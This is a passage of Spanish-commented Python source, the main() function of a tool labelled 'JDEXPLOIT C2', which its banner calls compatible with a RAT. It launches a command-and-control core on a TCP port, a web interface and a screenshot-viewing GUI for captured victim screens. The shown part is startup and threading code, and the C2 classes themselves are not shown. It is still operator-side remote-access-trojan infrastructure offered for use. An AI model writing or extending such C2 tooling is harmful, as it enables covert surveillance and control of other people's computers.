     ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██   ██║██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚█████╔╝██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{Colors.END}
{Colors.GREEN}[🔥] JDEXPLOIT C2 - VERSIÓN PROFESIONAL{Colors.END}
{Colors.CYAN}[*] Modo: Texto Plano (compatible con RAT){Colors.END}
    """)
    
    # Inicializar C2 Core
    c2 = C2Core()
    c2.start()
    
    # Preguntar si iniciar GUI
    use_gui = False
    try:
        response = input(f"{Colors.YELLOW}[?] ¿Iniciar GUI de screenshots? (s/n): {Colors.END}")
        use_gui = response.lower() == 's'
    except:
        pass
    
    # Iniciar web server en hilo separado
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    
    print(f"{Colors.CYAN}[*] Web UI: http://{HOST}:{WEB_PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] C2 TCP: {HOST}:{C2_PORT}{Colors.END}")
    print(f"{Colors.CYAN}[*] Screenshots: {SCREENSHOT_DIR}/{Colors.END}")
    
    # Iniciar web server en hilo
    web_thread = threading.Thread(target=web_server.serve_forever, daemon=True)
    web_thread.start()
    
    if use_gui:
        try:
            # Verificar dependencias
            import PIL
            print(f"{Colors.GREEN}[+] Iniciando GUI de screenshots...{Colors.END}")
            
            # Crear y ejecutar GUI en el hilo principal
            gui = ScreenshotViewer(c2)
            c2.set_gui(gui)
            gui.run()  # Esto bloquea hasta que se cierre la GUI
            
        except ImportError as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Instala Pillow: pip install Pillow{Colors.END}")
            print(f"{Colors.CYAN}[*] Continuando sin GUI...{Colors.END}")
            
            # Mantener el programa vivo sin GUI
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
        except Exception as e:
            print(f"{Colors.RED}[-] Error en GUI: {e}{Colors.END}")
            print(f"{Colors.CYAN}[*] Continuando sin GUI...{Colors.END}")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
    else:
        # Modo sin GUI - mantener vivo
        print(f"{Colors.CYAN}[*] Presiona Ctrl+C para detener{Colors.END}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    # Limpiar al salir
    print(f"\n{Colors.YELLOW}[!] Deteniendo servidores...{Colors.END}")
    c2.stop()
    web_server.shutdown()

if __name__ == '__main__':
    main()
